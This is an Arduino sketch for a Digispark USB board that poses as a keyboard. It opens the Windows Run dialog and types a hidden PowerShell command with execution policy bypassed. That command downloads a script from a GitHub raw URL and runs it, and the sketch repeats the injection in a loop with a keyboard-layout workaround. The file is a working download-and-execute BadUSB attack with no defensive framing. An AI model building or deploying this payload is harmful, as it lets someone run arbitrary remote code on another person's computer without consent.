#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}

const char payload [] = "powershell -W Minimized -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a";

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

   int len = strlen(payload);
    for (int i=0;i<len;i++) {
      if(payload[i] == '/'){
        DigiKeyboard.sendKeyStroke(MOD_SHIFT_RIGHT, KEY_3);
      }
      else
      {
        DigiKeyboard.print((char) payload[i]);
      }
      DigiKeyboard.delay(0);
    }
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

//////////////////////////////////////////////////////////////////////////////////
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

   int len1 = strlen(payload);
    for (int i=0;i<len1;i++) {
      if(payload[i] == '/'){
        DigiKeyboard.write(0x60);
      }
      else
      {
        DigiKeyboard.print((char) payload[i]);
      }
      DigiKeyboard.delay(0);
    }
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(50000);
}

// slash in multi langiage is: 0x60

//powershell -W Minimized -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a
